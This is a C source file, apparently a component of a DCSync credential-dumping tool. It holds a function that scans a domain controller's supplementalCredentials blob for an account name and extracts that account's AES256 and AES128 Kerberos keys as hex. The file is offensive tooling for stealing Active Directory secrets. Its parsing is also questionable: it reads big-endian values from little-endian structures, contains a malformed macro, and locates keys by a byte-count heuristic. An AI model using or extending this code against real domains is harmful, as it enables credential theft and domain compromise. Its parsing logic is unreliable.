#include "dcsync.h"
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>

#define MSVCRT$memcpy memcpy;

static USHORT ReadBE16(const BYTE *p) {
  USHORT v;
  memcpy(&v, p, sizeof(v));
  return (USHORT)((v << 8) | (v >> 8));
}

// Parse Kerberos keys from supplementalCredentials
BOOL ParseKerberosKeys(const BYTE *propertyData, DWORD propertyLen,
                       const char *samAccountName, const char *dcHostname,
                       DWORD accountType, char *aes256Out, char *aes128Out) {

  if (!propertyData || propertyLen < 32 || !samAccountName) {
    wprintf(L"invalid input\n");
    return FALSE;
  }

  const BYTE *structStart = propertyData;

  if (propertyData[0] == 0 && propertyData[1] == 0 && propertyData[2] == 0 &&
      propertyData[3] >= 1 && propertyData[3] <= 3) {
    structStart += 4;
    propertyLen -= 4;
  }

  if (propertyLen < 16)
    return FALSE;

  USHORT revision = ReadBE16(structStart);
  BOOL isRevision0 = (revision == 0);

  USHORT credCount = ReadBE16(structStart + (isRevision0 ? 2 : 4));
  if (credCount == 0 || credCount > 100)
    credCount = 3;

  USHORT saltLen = 0;

  if (revision == 0 && propertyLen >= 8)
    saltLen = ReadBE16(structStart + 6);
  else if (revision == 1 && propertyLen >= 10)
    saltLen = ReadBE16(structStart + 8);
  else if (propertyLen >= 8)
    saltLen = ReadBE16(structStart + 6);

  if (saltLen == 0 || saltLen > 500)
    return FALSE;

  /* ---------------- BUILD SEARCH NAME ---------------- */

  char searchName[256] = {0};
  size_t searchLen = strlen(samAccountName);

  if (searchLen >= sizeof(searchName))
    searchLen = sizeof(searchName) - 1;

  memcpy(searchName, samAccountName, searchLen);

  /* UTF16 conversion */
  BYTE searchUTF16[512] = {0};
  if (searchLen * 2 >= sizeof(searchUTF16))
    return FALSE;

  for (size_t i = 0; i < searchLen; i++) {
    searchUTF16[i * 2] = (BYTE)searchName[i];
    searchUTF16[i * 2 + 1] = 0x00;
  }

  DWORD descriptorStart = isRevision0 ? 32 : 28;
  if (descriptorStart >= propertyLen)
    return FALSE;

  DWORD matchOffset = 0xFFFFFFFF;

  /* ---------------- MATCH SEARCH ---------------- */

  for (DWORD i = descriptorStart + 20; i + (searchLen * 2) <= propertyLen;
       i++) {

    BOOL match = TRUE;

    for (DWORD j = 0; j < searchLen * 2; j++) {
      BYTE a = propertyData[i + j];
      BYTE b = searchUTF16[j];

      if (j % 2 == 0) {
        if (a >= 'a' && a <= 'z')
          a -= 32;
        if (b >= 'a' && b <= 'z')
          b -= 32;
      }

      if (a != b) {
        match = FALSE;
        break;
      }
    }

    if (match) {
      matchOffset = i;
      break;
    }
  }

  if (matchOffset == 0xFFFFFFFF)
    return FALSE;

  DWORD saltEnd = matchOffset + (searchLen * 2);

  if (propertyLen < saltEnd + 48)
    return FALSE;

  /* ---------------- KEY SCAN ---------------- */

  for (DWORD off = saltEnd; off + 48 <= propertyLen; off++) {

    DWORD zeroCount = 0, highBitCount = 0;

    for (DWORD i = 0; i < 48; i++) {
      BYTE b = propertyData[off + i];
      if (b == 0)
        zeroCount++;
      if (b >= 0x80)
        highBitCount++;
    }

    if (zeroCount > 30 || highBitCount < 5)
      continue;

    if (aes256Out)
      BytesToHex(propertyData + off, 32, aes256Out);
    if (aes128Out)
      BytesToHex(propertyData + off + 32, 16, aes128Out);

    return TRUE;
  }

  return FALSE;
}
